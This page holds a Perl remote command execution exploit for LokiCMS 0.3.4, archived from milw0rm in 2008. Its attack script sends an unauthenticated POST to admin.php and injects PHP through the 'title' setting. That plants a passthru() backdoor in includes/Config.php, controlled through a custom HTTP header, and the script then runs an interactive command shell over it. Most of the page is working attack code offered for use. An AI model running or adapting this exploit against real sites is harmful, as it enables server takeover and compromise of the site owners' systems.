<html><head><title>LokiCMS 0.3.4 writeconfig() Remote Command Execution Exploit</title></head><pre># Author:    __GiReX__	
# Homepage:  http://girex.altervista.org

# CMS:       LokiCMS 0.3.4
# URL:       http://www.lokicms.com/

# Description:  LokiCMS is still vulnerable to Remote Command Execution (see: http://milw0rm.com/exploits/5408)
# The exploit changed becouse the vars changed but the bugged function is the same: writeconfig()
# LokiCMS does not check the access to admin.php via POST...

#!/usr/bin/perl -w
# LokiCMS &lt;= 0.3.4 Remote Command Execution Exploit
# Needs with magic_quotes_gpc = Off
# Coded by __GiReX__

use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print &quot;[-] Usage: perl $0 [host] [path]\n&quot;;
     print &quot;[-] Example: perl $0 localhost /lokicms/\n\n&quot;;
     exit;
}

my $lwp = new LWP::UserAgent or die;
 
my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;

banner();
my $res = $lwp-&gt;post($target.'admin.php', 
                                [ 'LokiACTION' =&gt;  'A_SAVE_G_SETTINGS',
                                  'title'      =&gt;  &quot;';echo \&quot;&lt;!-- INFECTED --&gt;\&quot;;if(strlen(\$_SERVER['HTTP_CMD']))&quot;.
                                                   &quot;passthru(\$_SERVER['HTTP_CMD']);//&quot;, 
                                  'language'   =&gt;  'english-utf-8',
                                  'theme'      =&gt;  'default' ]);

if($res-&gt;is_error)
{
    print &quot;[-] Request mistake. Exploit terminated!\n&quot;;
    exit ();
}
							  
while(1)
{
    print &quot;[+] shell:~\$ &quot;;
    chomp($cmd = &lt;STDIN&gt;);
    last if $cmd eq 'exit';
     
    $lwp-&gt;default_header( 'CMD' =&gt; $cmd );
    my $res = $lwp-&gt;get($target.'includes/Config.php');
	 
    if($res-&gt;is_success and $res-&gt;content =~ /INFECTED/)
    {
        print &quot;\n&quot;. substr($res-&gt;content, index($res-&gt;content, 'INFECTED') + 12).&quot;\n&quot;;
    }
    else
    {
        print &quot;[-] PHP Code not injected. maybe magic_quotes_gpc = On!\n&quot;;
        last;
    }
}

sub banner
{
     print &quot;[+] LokiCMS 0.3.4 Remote Command Execution Exploit\n&quot;;
     print &quot;[+] Coded by __GiReX__\n&quot;;
     print &quot;\n&quot;;
}

# milw0rm.com [2008-10-13]</pre></html>